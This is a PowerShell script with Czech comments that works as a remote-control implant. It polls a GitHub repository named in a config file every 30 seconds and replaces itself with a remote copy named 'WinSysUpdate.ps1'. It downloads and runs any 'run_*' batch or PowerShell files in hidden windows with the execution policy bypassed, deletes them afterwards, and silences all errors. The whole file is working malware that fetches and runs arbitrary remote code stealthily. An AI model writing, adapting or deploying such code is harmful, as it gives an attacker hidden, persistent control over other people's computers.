# --- UNIVERSAL WATCHER WITH AUTO-CLEAN ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"

if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main"
} else { exit }

while($true) {
    try {
        # 1. Self-Update logic
        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
        if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
            Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
            exit
        }

        # 2. Fetching commands from GitHub API
        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/"
        foreach ($f in $files) {
            $n = $f.name
            $u = $f.download_url

            # --- CREATE command (Stay on disk) ---
            if ($n -like "create_*") {
                $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                Set-Content -Path (Join-Path $dir ($n -replace "create_","")) -Value $c
            }

            # --- RUN command (Auto-delete after start) ---
            if ($n -like "run_*") {
                $p = Join-Path $dir $n
                Invoke-WebRequest -Uri $u -OutFile $p
                
                if ($n -like "*.bat") { 
                    # Spustí a počká na dokončení
                    Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden -Wait 
                }
                elseif ($n -like "*.ps1") { 
                    # Spustí a počká na dokončení
                    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden -Wait 
                }

                # SMAŽE SOUBOR Z PC (WinData), aby se nespouštěl znovu
                if (Test-Path $p) { Remove-Item -Path $p -Force }
            }
        }
    } catch { 
        # Tiché chyby, aby okno neblikalo
    }
    Start-Sleep -Seconds 30
}
